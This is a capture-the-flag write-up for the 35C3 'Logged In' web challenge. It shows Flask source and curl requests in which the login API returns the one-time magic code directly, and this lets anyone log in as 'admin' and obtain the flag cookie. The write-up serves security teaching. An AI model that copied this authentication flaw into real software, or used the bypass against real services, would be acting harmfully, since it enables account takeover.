# Logged In
Web

## Description:
> Phew, we totally did not set up our mail server yet. This is bad news since nobody can get into their accounts at the moment... It'll be in our next sprint. Until then, since you cannot login: enjoy our totally finished software without account.


## Solution:

This is a "Wee" challenge - see basic explanation [here](./Wee/).

Clicking the "Login" button pops up a login box, where the user is requested to enter an email or username.

If we try to enter "admin", a request gets sent to `/api/login` and the logic box now requests: "We have sent you an email with a magic code! Please enter it below".

Let's check what happens in the server side:

```python
@app.route("/api/login", methods=["POST"])
def login():
    print("Logging in?")
    # TODO Send Mail
    json = request.get_json(force=True)
    login = json["email"].strip()
    try:
        userid, name, email = query_db("SELECT id, name, email FROM users WHERE email=? OR name=?", (login, login))
    except Exception as ex:
        raise Exception("UserDoesNotExist")
    return get_code(name)
```

As expected, the mail service does not work yet, and the required code is returned to the user in the response:
```console
root@kali:/media/sf_CTFs/35c3ctf/Logged_In# curl 'http://35.207.132.47/api/login' -H 'Content-Type: application/json; charset=UTF-8' --data-binary '{"email":"admin"}' && echo
lrsrge
```

If we try this code, we get the following response:
```console
root@kali:/media/sf_CTFs/35c3ctf/Logged_In# curl 'http://35.207.132.47/api/verify' -H 'Content-Type: application/json; charset=UTF-8' --data-binary '{"code":"lrsrge"}' -i && echo
HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Tue, 01 Jan 2019 19:57:30 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: keep-alive
Set-Cookie: token=vsfrhvlixgcakewqactbyotkdsrhjehq; Expires=Sun, 19-Jan-2087 23:11:37 GMT; Max-Age=2147483647; Path=/
Set-Cookie: name=admin; Expires=Sun, 19-Jan-2087 23:11:37 GMT; Max-Age=2147483647; Path=/
Set-Cookie: logged_in=35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS; Path=/
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Security-Policy: script-src 'self' 'unsafe-inline';
Referrer-Policy: no-referrer-when-downgrade
Feature-Policy: geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; fullscreen *; payment 'self';
```

The matching code is:
```python
@app.route("/api/verify", methods=["POST"])
def verify():
    code = request.get_json(force=True)["code"].strip()
    if not code:
        raise Exception("CouldNotVerifyCode")
    userid, = query_db("SELECT userId FROM userCodes WHERE code=?", code)
    db = get_db()
    c = db.cursor()
    c.execute("DELETE FROM userCodes WHERE userId=?", (userid,))
    token = random_code(32)
    c.execute("INSERT INTO userTokens (userId, token) values(?,?)", (userid, token))
    db.commit()
    name, = query_db("SELECT name FROM users WHERE id=?", (userid,))
    resp = make_response()
    resp.set_cookie("token", token, max_age=2 ** 31 - 1)
    resp.set_cookie("name", name, max_age=2 ** 31 - 1)
    resp.set_cookie("logged_in", LOGGED_IN)
    return resp
```

And we are logged in as "admin", with the flag being sent as part of the cookie: 35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS